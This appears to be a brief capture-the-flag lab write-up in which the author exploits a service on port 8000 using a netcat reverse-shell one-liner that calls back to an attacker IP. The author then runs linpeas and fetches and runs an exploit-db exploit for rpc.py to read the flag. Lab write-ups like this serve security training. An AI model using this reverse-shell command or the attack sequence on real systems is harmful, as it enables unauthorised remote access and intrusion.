# PC

So i start by scanning the target and see an interesting service on port 8000:

<figure><img src="../../../.gitbook/assets/image (4).png" alt=""><figcaption></figcaption></figure>

I input:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 192.168.45.245 7878 >/tmp/f
```

and get a shell:

<figure><img src="../../../.gitbook/assets/image (1) (1).png" alt=""><figcaption></figcaption></figure>

Not very useful but let's see so i run a linpeas:

<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

Ok so i look up rpc.py and find some exploits:

{% embed url="https://www.exploit-db.com/exploits/50983?source=post_page-----7619983c7d63---------------------------------------" %}

so i wget the script on the target machine and run it with the command:

<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

and after running it we can see flag.txt in our tmp file, could've also gotten a reverse shell but got lazy
